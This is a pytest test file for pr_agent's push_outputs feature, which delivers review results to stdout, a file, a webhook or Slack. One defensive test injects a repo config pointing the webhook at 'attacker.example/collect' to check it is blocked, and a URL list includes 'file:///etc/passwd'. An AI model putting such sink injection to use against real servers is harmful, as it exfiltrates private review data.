import asyncio
import json
import threading
from types import SimpleNamespace
from unittest.mock import AsyncMock

import pytest
from starlette_context import request_cycle_context

from pr_agent.algo import run_output
from pr_agent.algo.run_output import async_push_outputs, push_outputs
from pr_agent.config_loader import get_settings


@pytest.fixture(autouse=True)
def _reset_push_outputs():
    # These tests mutate the global settings singleton; restore to disabled afterwards
    # so state can't leak into other test modules.
    yield
    s = get_settings()
    s.set('PUSH_OUTPUTS.ENABLE', False)
    s.set('PUSH_OUTPUTS.CHANNELS', [])
    s.set('PUSH_OUTPUTS.FILE_PATH', 'pr-agent-outputs/reviews.jsonl')
    s.set('PUSH_OUTPUTS.WEBHOOK_URL', '')
    s.set('PUSH_OUTPUTS.SLACK_WEBHOOK_URL', '')


class TestPushOutputs:
    @pytest.mark.asyncio
    async def test_async_adapter_keeps_the_event_loop_responsive_and_waits_for_delivery(self, monkeypatch):
        get_settings().set("PUSH_OUTPUTS.ENABLE", True)
        loop = asyncio.get_running_loop()
        started = asyncio.Event()
        release = threading.Event()
        delivered = []

        def blocking_push(message_type, payload, markdown):
            loop.call_soon_threadsafe(started.set)
            assert release.wait(timeout=5)
            delivered.append((message_type, payload, markdown))

        monkeypatch.setattr(run_output, "push_outputs", blocking_push)
        delivery = asyncio.create_task(async_push_outputs("review", {"score": 1}, "review markdown"))
        try:
            await asyncio.wait_for(started.wait(), timeout=2)
            assert not delivery.done()
            assert not delivered
        finally:
            release.set()
            await asyncio.wait_for(delivery, timeout=2)
        assert delivered == [("review", {"score": 1}, "review markdown")]

    @pytest.mark.asyncio
    async def test_cancelling_async_adapter_waits_for_a_started_sink_thread(self, monkeypatch):
        get_settings().set("PUSH_OUTPUTS.ENABLE", True)
        loop = asyncio.get_running_loop()
        started = asyncio.Event()
        finished = asyncio.Event()
        release = threading.Event()
        delivered = []

        def blocking_push(*_args):
            loop.call_soon_threadsafe(started.set)
            assert release.wait(timeout=5)
            delivered.append("completed")
            loop.call_soon_threadsafe(finished.set)

        monkeypatch.setattr(run_output, "push_outputs", blocking_push)
        delivery = asyncio.create_task(async_push_outputs("review", {"score": 1}, "review markdown"))
        try:
            await asyncio.wait_for(started.wait(), timeout=2)
            delivery.cancel()
            await asyncio.sleep(0)
            assert not delivery.done()
            assert not delivered
        finally:
            release.set()
            await asyncio.wait_for(finished.wait(), timeout=2)
            await asyncio.wait_for(delivery, timeout=2)
        assert delivered == ["completed"]

    @pytest.mark.asyncio
    async def test_async_adapter_uses_request_settings_and_preserves_channel_order(self, monkeypatch):
        get_settings().set("PUSH_OUTPUTS.ENABLE", False)
        settings = {"push_outputs": {
            "enable": True, "channels": ["slack", "webhook"],
            "webhook_url": "https://example.test/hook", "slack_webhook_url": "https://example.test/slack",
        }}
        payload = {"score": 1}
        calls = []
        loop_thread = threading.get_ident()

        def post(url, **kwargs):
            calls.append((url, kwargs, get_settings(), threading.get_ident()))
            return SimpleNamespace(status_code=200)

        monkeypatch.setattr(run_output.requests, "post", post)
        with request_cycle_context({"settings": settings}):
            await async_push_outputs("review", payload, "review markdown")

        assert [call[0] for call in calls] == ["https://example.test/hook", "https://example.test/slack"]
        assert all(call[2] is settings and call[3] != loop_thread for call in calls)
        assert all(call[1]["timeout"] == 5 and call[1]["allow_redirects"] is False for call in calls)
        assert calls[0][1]["json"]["payload"] is payload
        assert calls[1][1]["json"] == {"text": "review markdown"}

    @pytest.mark.asyncio
    @pytest.mark.parametrize("enable", [False, "false", "  FALSE  ", "0", "no", "", None])
    async def test_disabled_async_outputs_do_not_submit_executor_work(self, monkeypatch, enable):
        dispatch = AsyncMock()
        monkeypatch.setattr(run_output.asyncio, "to_thread", dispatch)
        with request_cycle_context({"settings": {"push_outputs": {"enable": enable}}}):
            await async_push_outputs("review", {"score": 1})
        dispatch.assert_not_awaited()

    @pytest.mark.asyncio
    async def test_async_setup_failure_is_non_fatal_and_does_not_submit_work(self, monkeypatch):
        warnings = []
        dispatch = AsyncMock()

        def fail_settings():
            raise RuntimeError("secret setup marker")

        monkeypatch.setattr(run_output, "get_settings", fail_settings)
        monkeypatch.setattr(run_output, "get_logger", lambda: SimpleNamespace(warning=warnings.append))
        monkeypatch.setattr(run_output.asyncio, "to_thread", dispatch)
        await async_push_outputs("review", {"payload-secret": 1}, "markdown-secret")
        dispatch.assert_not_awaited()
        assert warnings == ["push_outputs failed: RuntimeError"]

    def test_async_executor_shutdown_is_non_fatal(self, monkeypatch):
        get_settings().set("PUSH_OUTPUTS.ENABLE", True)
        warnings = []
        monkeypatch.setattr(run_output, "get_logger", lambda: SimpleNamespace(warning=warnings.append))

        async def deliver_after_shutdown():
            await asyncio.get_running_loop().shutdown_default_executor()
            await async_push_outputs("review", {"score": 1})

        asyncio.run(deliver_after_shutdown())
        assert warnings == ["push_outputs failed: RuntimeError"]

    @pytest.mark.asyncio
    async def test_async_dispatch_failure_logs_only_exception_type(self, monkeypatch):
        get_settings().set("PUSH_OUTPUTS.ENABLE", True)
        warnings = []
        dispatch = AsyncMock(side_effect=RuntimeError("secret dispatch marker"))
        monkeypatch.setattr(run_output, "get_logger", lambda: SimpleNamespace(warning=warnings.append))
        monkeypatch.setattr(run_output.asyncio, "to_thread", dispatch)

        await async_push_outputs("review", {"payload-secret": 1}, "markdown-secret")

        dispatch.assert_awaited_once()
        assert warnings == ["push_outputs failed: RuntimeError"]

    @pytest.mark.asyncio
    async def test_concurrent_async_stdout_records_remain_separate_json_lines(self, monkeypatch):
        chunks = []
        start = threading.Barrier(2)
        second_body = threading.Event()
        original = run_output.push_outputs

        def synchronized_push(*args):
            start.wait(timeout=5)
            original(*args)

        class InterleavedStdout:
            def write(self, text):
                chunks.append(text)
                if text.startswith("{"):
                    if len(chunks) == 1:
                        # Let a second worker expose print's separate body/newline writes.
                        second_body.wait(timeout=1)
                    else:
                        second_body.set()
                return len(text)

        monkeypatch.setattr(run_output, "push_outputs", synchronized_push)
        monkeypatch.setattr(run_output.sys, "stdout", InterleavedStdout())
        with request_cycle_context({"settings": {"push_outputs": {"enable": True, "channels": ["stdout"]}}}):
            await asyncio.gather(async_push_outputs("review", {"id": 1}),
                                 async_push_outputs("review", {"id": 2}))
        records = [json.loads(line) for line in "".join(chunks).splitlines()]
        assert sorted(record["payload"]["id"] for record in records) == [1, 2]

    def test_disabled_by_default_is_noop(self, monkeypatch, tmp_path):
        get_settings().set('PUSH_OUTPUTS.ENABLE', False)
        get_settings().set('PUSH_OUTPUTS.CHANNELS', ['file'])
        get_settings().set('PUSH_OUTPUTS.FILE_PATH', str(tmp_path / 'out.jsonl'))

        push_outputs("review", payload={"a": 1}, markdown="hi")

        assert not (tmp_path / 'out.jsonl').exists()

    def test_string_false_stays_disabled(self, monkeypatch, tmp_path):
        # env vars arrive as strings; "false" must not enable the feature
        get_settings().set('PUSH_OUTPUTS.ENABLE', "false")
        get_settings().set('PUSH_OUTPUTS.CHANNELS', ['file'])
        get_settings().set('PUSH_OUTPUTS.FILE_PATH', str(tmp_path / 'out.jsonl'))

        push_outputs("review", payload={"a": 1}, markdown="hi")

        assert not (tmp_path / 'out.jsonl').exists()

    def test_file_channel_appends_jsonl(self, monkeypatch, tmp_path):
        out = tmp_path / 'nested' / 'out.jsonl'
        get_settings().set('PUSH_OUTPUTS.ENABLE', True)
        get_settings().set('PUSH_OUTPUTS.CHANNELS', ['file'])
        get_settings().set('PUSH_OUTPUTS.FILE_PATH', str(out))

        push_outputs("review", payload={"a": 1}, markdown="hello")

        lines = out.read_text(encoding='utf-8').splitlines()
        assert len(lines) == 1
        record = json.loads(lines[0])
        assert record["type"] == "review"
        assert record["payload"] == {"a": 1}
        assert record["markdown"] == "hello"
        assert "timestamp" in record

    def test_slack_channel_posts_text(self, monkeypatch):
        get_settings().set('PUSH_OUTPUTS.ENABLE', True)
        get_settings().set('PUSH_OUTPUTS.CHANNELS', ['slack'])
        slack_url = 'https://example.test/slack-hook'
        get_settings().set('PUSH_OUTPUTS.SLACK_WEBHOOK_URL', slack_url)

        captured = {}

        def fake_post(url, json=None, timeout=None, **kwargs):
            captured['url'] = url
            captured['json'] = json
            return SimpleNamespace(status_code=200)

        monkeypatch.setattr(run_output.requests, 'post', fake_post)

        push_outputs("review", payload={"a": 1}, markdown="a markdown review")

        assert captured['url'] == slack_url
        assert captured['json'] == {"text": "a markdown review"}

    def test_repo_settings_cannot_enable_push_outputs(self, monkeypatch):
        """A repo's .pr_agent.toml must not be able to enable push_outputs or set its sink URLs;
        that would allow SSRF / exfiltration of review data to an arbitrary host on a shared server."""
        from pr_agent.git_providers import utils as gp_utils

        get_settings().unset("push_outputs")
        get_settings().set("push_outputs", {"enable": False, "channels": [],
                                            "webhook_url": "", "slack_webhook_url": ""})
        get_settings().config.use_repo_settings_file = True

        repo_toml = (b'[push_outputs]\nenable = true\nchannels = ["webhook"]\n'
                     b'webhook_url = "https://attacker.example/collect"\n')

        class FakeGitProvider:
            def __init__(self, *a, **kw):
                pass

            def get_repo_settings(self):
                return repo_toml

        monkeypatch.setattr(gp_utils, "get_git_provider_with_context", lambda _url: FakeGitProvider())
        gp_utils.apply_repo_settings("https://example.com/owner/repo/pull/1")

        result = get_settings().get("push_outputs")
        assert result.get("enable") is False, "Repo settings must not enable push_outputs"
        assert "attacker.example" not in str(result), "Repo settings must not inject a sink URL"

    def test_errors_are_non_fatal(self, monkeypatch):
        get_settings().set('PUSH_OUTPUTS.ENABLE', True)
        get_settings().set('PUSH_OUTPUTS.CHANNELS', ['webhook'])
        get_settings().set('PUSH_OUTPUTS.WEBHOOK_URL', 'https://example.invalid/hook')

        def boom(*args, **kwargs):
            raise ConnectionError("no network")

        monkeypatch.setattr(run_output.requests, 'post', boom)

        # Must not raise.
        push_outputs("review", payload={"a": 1}, markdown="hi")

    @pytest.mark.parametrize("bad_url", [
        "http://example.test/hook",       # plaintext
        "ftp://example.test/hook",        # non-HTTP scheme
        "example.test/hook",              # scheme-less, urlparse gives no host
        "https:///hook",                  # no host
        "file:///etc/passwd",
    ])
    def test_non_https_sink_urls_are_ignored(self, monkeypatch, bad_url):
        get_settings().set('PUSH_OUTPUTS.ENABLE', True)
        get_settings().set('PUSH_OUTPUTS.CHANNELS', ['webhook', 'slack'])
        get_settings().set('PUSH_OUTPUTS.WEBHOOK_URL', bad_url)
        get_settings().set('PUSH_OUTPUTS.SLACK_WEBHOOK_URL', bad_url)

        posts = []
        monkeypatch.setattr(run_output.requests, 'post',
                            lambda url, **kwargs: posts.append(url) or SimpleNamespace(status_code=200))

        push_outputs("review", payload={"a": 1}, markdown="hi")

        assert posts == [], f"{bad_url} should not have been POSTed to"

    def test_https_sink_url_is_accepted(self, monkeypatch):
        get_settings().set('PUSH_OUTPUTS.ENABLE', True)
        get_settings().set('PUSH_OUTPUTS.CHANNELS', ['webhook'])
        get_settings().set('PUSH_OUTPUTS.WEBHOOK_URL', 'https://example.test/hook')

        posts = []
        monkeypatch.setattr(run_output.requests, 'post',
                            lambda url, **kwargs: posts.append(url) or SimpleNamespace(status_code=200))

        push_outputs("review", payload={"a": 1}, markdown="hi")

        assert posts == ['https://example.test/hook']

    def test_setup_errors_remain_non_fatal_and_secret_safe(self, monkeypatch):
        warnings = []

        def fail_settings():
            raise RuntimeError("secret setup marker")

        monkeypatch.setattr(run_output, 'get_settings', fail_settings)
        monkeypatch.setattr(run_output, 'get_logger',
                            lambda: SimpleNamespace(warning=warnings.append))

        push_outputs("review", payload={"payload-secret": 1}, markdown="markdown-secret")

        assert warnings == ["push_outputs failed: RuntimeError"]
        assert "secret" not in warnings[0]

    def test_webhook_exception_does_not_skip_slack(self, monkeypatch):
        get_settings().set('PUSH_OUTPUTS.ENABLE', True)
        get_settings().set('PUSH_OUTPUTS.CHANNELS', ['webhook', 'slack'])
        webhook_url = 'https://example.test/webhook-secret'
        slack_url = 'https://example.test/slack-secret'
        get_settings().set('PUSH_OUTPUTS.WEBHOOK_URL', webhook_url)
        get_settings().set('PUSH_OUTPUTS.SLACK_WEBHOOK_URL', slack_url)
        posts = []
        warnings = []

        def fake_post(url, **kwargs):
            posts.append((url, kwargs))
            if url == webhook_url:
                raise ConnectionError("transport-secret")
            return SimpleNamespace(status_code=200)

        monkeypatch.setattr(run_output.requests, 'post', fake_post)
        monkeypatch.setattr(run_output, 'get_logger',
                            lambda: SimpleNamespace(warning=warnings.append))

        push_outputs("review", payload={"payload-secret": 1}, markdown="markdown-secret")

        assert [url for url, _ in posts] == [webhook_url, slack_url]
        assert posts[0][1]['timeout'] == 5
        assert posts[0][1]['allow_redirects'] is False
        assert posts[1][1]['timeout'] == 5
        assert posts[1][1]['allow_redirects'] is False
        assert warnings == ["push_outputs: webhook failed: ConnectionError"]
        assert not any(secret in warnings[0] for secret in
                       (webhook_url, slack_url, "transport-secret", "payload-secret", "markdown-secret"))

    @pytest.mark.parametrize("status_code", [302, 500])
    def test_webhook_non_2xx_warns_and_does_not_skip_slack(self, monkeypatch, status_code):
        get_settings().set('PUSH_OUTPUTS.ENABLE', True)
        get_settings().set('PUSH_OUTPUTS.CHANNELS', ['webhook', 'slack'])
        webhook_url = 'https://example.test/webhook'
        slack_url = 'https://example.test/slack'
        get_settings().set('PUSH_OUTPUTS.WEBHOOK_URL', webhook_url)
        get_settings().set('PUSH_OUTPUTS.SLACK_WEBHOOK_URL', slack_url)
        posts = []
        warnings = []

        def fake_post(url, **kwargs):
            posts.append(url)
            if url == webhook_url:
                return SimpleNamespace(status_code=status_code, text="response-secret")
            return SimpleNamespace(status_code=204)

        monkeypatch.setattr(run_output.requests, 'post', fake_post)
        monkeypatch.setattr(run_output, 'get_logger',
                            lambda: SimpleNamespace(warning=warnings.append))

        push_outputs("review", payload={"a": 1}, markdown="hi")

        assert posts == [webhook_url, slack_url]
        assert warnings == [f"push_outputs: webhook failed with status {status_code}"]
        assert "response-secret" not in warnings[0]

    @pytest.mark.parametrize("status_code", [200, 204])
    def test_remote_2xx_responses_are_silent(self, monkeypatch, status_code):
        get_settings().set('PUSH_OUTPUTS.ENABLE', True)
        get_settings().set('PUSH_OUTPUTS.CHANNELS', ['webhook', 'slack'])
        get_settings().set('PUSH_OUTPUTS.WEBHOOK_URL', 'https://example.test/webhook')
        get_settings().set('PUSH_OUTPUTS.SLACK_WEBHOOK_URL', 'https://example.test/slack')
        warnings = []
        monkeypatch.setattr(run_output.requests, 'post',
                            lambda *args, **kwargs: SimpleNamespace(status_code=status_code))
        monkeypatch.setattr(run_output, 'get_logger',
                            lambda: SimpleNamespace(warning=warnings.append))

        push_outputs("review", payload={"a": 1}, markdown="hi")

        assert warnings == []

    def test_malformed_webhook_url_does_not_skip_slack(self, monkeypatch):
        get_settings().set('PUSH_OUTPUTS.ENABLE', True)
        get_settings().set('PUSH_OUTPUTS.CHANNELS', ['webhook', 'slack'])
        get_settings().set('PUSH_OUTPUTS.WEBHOOK_URL', 'https://[')
        slack_url = 'https://example.test/slack'
        get_settings().set('PUSH_OUTPUTS.SLACK_WEBHOOK_URL', slack_url)
        posts = []
        warnings = []
        monkeypatch.setattr(run_output.requests, 'post',
                            lambda url, **kwargs: posts.append(url) or SimpleNamespace(status_code=200))
        monkeypatch.setattr(run_output, 'get_logger',
                            lambda: SimpleNamespace(warning=warnings.append))

        push_outputs("review", payload={"a": 1}, markdown="hi")

        assert posts == [slack_url]
        assert warnings == ["push_outputs: webhook failed: ValueError"]
        assert "https://[" not in warnings[0]

    def test_stdout_failure_does_not_skip_later_destinations(self, monkeypatch, tmp_path):
        get_settings().set('PUSH_OUTPUTS.ENABLE', True)
        get_settings().set('PUSH_OUTPUTS.CHANNELS', ['stdout', 'file', 'webhook', 'slack'])
        out = tmp_path / 'out.jsonl'
        get_settings().set('PUSH_OUTPUTS.FILE_PATH', str(out))
        get_settings().set('PUSH_OUTPUTS.WEBHOOK_URL', 'https://example.test/webhook')
        get_settings().set('PUSH_OUTPUTS.SLACK_WEBHOOK_URL', 'https://example.test/slack')
        posts = []
        warnings = []

        def fail_print(*args, **kwargs):
            raise OSError("stdout-secret")

        monkeypatch.setattr('builtins.print', fail_print)
        monkeypatch.setattr(run_output.requests, 'post',
                            lambda url, **kwargs: posts.append(url) or SimpleNamespace(status_code=200))
        monkeypatch.setattr(run_output, 'get_logger',
                            lambda: SimpleNamespace(warning=warnings.append))

        push_outputs("review", payload={"a": 1}, markdown="hi")

        assert out.exists()
        assert posts == ['https://example.test/webhook', 'https://example.test/slack']
        assert warnings == ["push_outputs: stdout failed: OSError"]

    def test_file_failure_does_not_skip_remote_destinations(self, monkeypatch, tmp_path):
        get_settings().set('PUSH_OUTPUTS.ENABLE', True)
        get_settings().set('PUSH_OUTPUTS.CHANNELS', ['file', 'webhook', 'slack'])
        get_settings().set('PUSH_OUTPUTS.FILE_PATH', str(tmp_path))
        get_settings().set('PUSH_OUTPUTS.WEBHOOK_URL', 'https://example.test/webhook')
        get_settings().set('PUSH_OUTPUTS.SLACK_WEBHOOK_URL', 'https://example.test/slack')
        posts = []
        warnings = []
        monkeypatch.setattr(run_output.requests, 'post',
                            lambda url, **kwargs: posts.append(url) or SimpleNamespace(status_code=200))
        monkeypatch.setattr(run_output, 'get_logger',
                            lambda: SimpleNamespace(warning=warnings.append))

        push_outputs("review", payload={"a": 1}, markdown="hi")

        assert posts == ['https://example.test/webhook', 'https://example.test/slack']
        assert warnings == ["push_outputs: file failed: IsADirectoryError"]

    def test_slack_failure_is_non_fatal_and_secret_safe(self, monkeypatch):
        get_settings().set('PUSH_OUTPUTS.ENABLE', True)
        get_settings().set('PUSH_OUTPUTS.CHANNELS', ['webhook', 'slack'])
        get_settings().set('PUSH_OUTPUTS.WEBHOOK_URL', 'https://example.test/webhook')
        slack_url = 'https://example.test/slack-secret'
        get_settings().set('PUSH_OUTPUTS.SLACK_WEBHOOK_URL', slack_url)
        warnings = []

        def fake_post(url, **kwargs):
            if url == slack_url:
                raise TimeoutError("slack-timeout-secret")
            return SimpleNamespace(status_code=200)

        monkeypatch.setattr(run_output.requests, 'post', fake_post)
        monkeypatch.setattr(run_output, 'get_logger',
                            lambda: SimpleNamespace(warning=warnings.append))

        push_outputs("review", payload={"a": 1}, markdown="hi")

        assert warnings == ["push_outputs: slack failed: TimeoutError"]
        assert slack_url not in warnings[0]
        assert "slack-timeout-secret" not in warnings[0]

    def test_slack_non_2xx_warns_without_response_content(self, monkeypatch):
        get_settings().set('PUSH_OUTPUTS.ENABLE', True)
        get_settings().set('PUSH_OUTPUTS.CHANNELS', ['slack'])
        get_settings().set('PUSH_OUTPUTS.SLACK_WEBHOOK_URL', 'https://example.test/slack')
        warnings = []
        monkeypatch.setattr(run_output.requests, 'post',
                            lambda *args, **kwargs: SimpleNamespace(status_code=429, text="response-secret"))
        monkeypatch.setattr(run_output, 'get_logger',
                            lambda: SimpleNamespace(warning=warnings.append))

        push_outputs("review", payload={"a": 1}, markdown="hi")

        assert warnings == ["push_outputs: slack failed with status 429"]
        assert "response-secret" not in warnings[0]

    def test_unknown_and_duplicate_channels_do_not_duplicate_delivery(self, monkeypatch):
        get_settings().set('PUSH_OUTPUTS.ENABLE', True)
        get_settings().set('PUSH_OUTPUTS.CHANNELS', ['unknown', 'webhook', 'webhook'])
        webhook_url = 'https://example.test/webhook'
        get_settings().set('PUSH_OUTPUTS.WEBHOOK_URL', webhook_url)
        posts = []
        monkeypatch.setattr(run_output.requests, 'post',
                            lambda url, **kwargs: posts.append(url) or SimpleNamespace(status_code=200))

        push_outputs("review", payload={"a": 1}, markdown="hi")

        assert posts == [webhook_url]
